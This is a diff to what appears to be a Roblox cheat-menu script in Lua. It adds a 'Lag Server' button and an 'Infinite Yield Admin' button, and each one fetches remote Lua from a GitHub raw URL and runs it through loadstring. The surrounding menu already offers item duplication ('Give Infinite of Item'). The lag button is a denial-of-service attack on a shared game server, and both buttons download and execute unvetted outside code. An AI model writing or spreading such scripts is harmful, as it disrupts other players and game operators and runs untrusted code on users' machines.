@@ -47,6 +47,18 @@ Main:NewButton("Give Infinite of Item", {
 	end
 })
 
+Main:NewButton("Lag Server (unequip build tool to stop)", {
+	Callback = function(pressed)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/yesfunny/main/lag.lua"))()
+	end
+})
+
+Main:NewButton("Infinite Yield Admin", {
+	Callback = function(pressed)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+	end
+})
+
 Discord:NewButton("Copy Discord (discord.gg/FJQXYfaAh2)", {
 	Callback = function(pressed)
         game:GetService("StarterGui"):SetCore("SendNotification", {
